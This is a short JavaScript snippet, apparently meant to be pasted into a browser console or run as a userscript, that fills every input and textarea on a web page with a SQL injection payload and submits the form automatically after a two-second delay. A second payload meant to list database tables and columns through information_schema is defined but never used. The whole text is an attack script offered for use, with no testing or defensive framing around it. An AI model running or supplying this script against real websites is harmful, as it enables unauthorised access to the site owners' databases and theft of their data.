(function() {
  // Log to confirm the script is running
  console.log("SQL Injection script running...");

  // SQL payloads to test
  const sqlPayloads = [
    "' OR 'a'='a",  // First payload
    "' UNION SELECT table_name, column_name FROM information_schema.columns --"  // Second payload
  ];

  // Select the input fields and set values
  const formInputs = document.querySelectorAll('input, textarea');
  
  formInputs.forEach(input => {
    console.log(`Injecting payload into input: ${input.name || input.id}`);
    input.value = sqlPayloads[0];  // Use the first payload from the array

    // Add event listener to handle form submission
    input.addEventListener('input', function() {
      const form = document.querySelector('form');
      if (form) {
        console.log("Form found, submitting...");
        form.submit();  // Submit the form after injection
      }
    });
  });

  // Optionally, you can set a timeout to execute after a delay
  setTimeout(() => {
    const form = document.querySelector('form');
    if (form) {
      console.log("Submitting form after timeout...");
      form.submit();
    }
  }, 2000);  // Delay in milliseconds (2 seconds)
})();
